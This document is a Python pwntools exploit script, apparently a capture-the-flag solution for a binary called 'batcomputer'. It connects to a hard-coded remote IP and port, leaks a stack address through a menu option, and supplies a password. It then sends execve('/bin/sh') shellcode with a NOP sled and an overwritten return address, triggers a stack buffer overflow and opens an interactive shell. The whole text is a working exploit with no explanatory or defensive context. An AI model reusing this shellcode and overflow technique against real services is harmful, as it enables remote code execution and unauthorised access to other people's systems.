import pwn
from pwn import *

#p = process('./batcomputer')

p = remote('178.62.96.143',31972) #178.62.96.143:31972

ip1 = p.recv()
print(ip1)

op_track = b'1' # track joker
p.sendline(op_track)

ip_track = p.recv()
ip_track_decode = ip_track.decode()
ip_track_final = ip_track_decode[54:66]
final = int(ip_track_final,16)
print(final,type(final))

op1 = b'2' # Chase joker
p.sendline(op1)

ip2 = p.recv()
print(ip2)

op2 = b"b4tp@$$w0rd!" #Enter password
p.sendline(op2)

ip3 = p.recv()
print(ip3)


payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
payload += b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
payload += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
payload += b"\x3b\x0f\x05"

NOP_Sled = b"\x90"*(84-len(payload))
Ret_addr = p64(final) 

op3 = payload + NOP_Sled + Ret_addr
print(op3)
p.sendline(op3)

ip4 = p.recv()
print(ip4)

op4 = b'4' #Sending a random option to trigger the buffer overflow
p.sendline(op4)

#core = Coredump('./core')

p.interactive()


 
